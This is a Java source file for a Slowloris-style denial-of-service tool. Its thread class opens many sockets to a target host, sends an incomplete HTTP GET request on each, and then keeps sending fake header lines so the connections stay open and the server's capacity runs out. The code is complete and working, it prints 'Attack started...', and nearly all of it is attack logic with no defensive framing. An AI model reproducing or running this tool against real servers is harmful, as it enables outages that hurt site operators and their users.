import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;

public class App extends Thread{

    private boolean stop;
    private String host;
    private int port;
    private int timeout;
    private int tcpTimeout = 5 * 1000;
    private int connections;
    static int failed = 0, packets = 0;

    public App(String host, int port, int timeout, int conn){
        this.stop = false;
        this.host = host;
        this.port = port;
        this.timeout = timeout;
        this.connections = conn;
    }

    /**
     * App is a Thread
     */
    public void run() {
        System.out.println("Attack started...");

        // w is used to track the status of the connections (true = connected)
        boolean[] w = new boolean[connections];

        // s is used for the connections reference
        Socket[] s = new Socket[connections];

        while (!stop) {
            try {
                System.out.println("Building Sockets...");
                initConnections(w, s);

                System.out.println("Sending Data...");
                sendData(w, s);

                Thread.sleep(timeout);

                if(stop) { System.out.println("Attack has been stopped---------"); break; }

            } catch (Exception e) {
                ++failed;
            }
        }

        closeAllConnections(s);
    }


    /**
     * Sends fake fields in header to keep the connection active
     * @param w - array containing the status of the connections
     * @param s - array of Sockets, reference to the created connections
     * @throws IOException
     */
    void sendData(boolean[] w, Socket[] s) throws IOException {
        for (int i = 0; i < connections; i++) {
            if (w[i]) {
                String fakeField = "X-Fake: FakeField\r\n";
                System.out.println("Sending fake field to socket nr " + i + " " + fakeField);

                PrintWriter out = new PrintWriter(s[i].getOutputStream());
                out.print(fakeField); // keeps the connection alive
                out.flush();

                ++packets;
            } else {
                w[i] = false;
                ++failed;
            }
        }

        System.out.println("Packets sent: " + packets);
        System.out.println("Packets failed: " + failed);
    }

    /**
     * Initializes the connections to the host
     * @param w - connections status
     * @param s - array of sockets (the connectinos to be established)
     * @throws IOException
     */
    void initConnections(boolean[] w, Socket[] s) throws IOException {
        for (int i = 0; i < connections; i++) {
            if (!w[i]) {
                s[i] = new Socket();
                InetAddress address = InetAddress.getByName(host);
                s[i].connect(new InetSocketAddress(address.getHostAddress(), port), tcpTimeout);
                w[i] = true;

                PrintWriter out = new PrintWriter(s[i].getOutputStream());
                String rand = "";

                // Partial Request
                String request ="GET" + " /" + rand + " HTTP/1.1\r\n"
                        + "Host: " + host + "\r\n"
                        + "Content-Type: */* \r\n"
                        + "Connection: keep-alive\r\n";
                out.print(request);
                out.flush();
                packets += 3;
            }
        }
    }

    /**
     * Closes all the open sockets
     * @param s - array of sockets(connections)
     */
    void closeAllConnections(Socket[] s) {
        for(Socket sock : s){
            try {
                sock.close();
            } catch (IOException e) { e.printStackTrace(); }
            catch (NullPointerException ne){ ne.printStackTrace(); }
        }

        System.out.println("All sockets have been closed!");
    }
}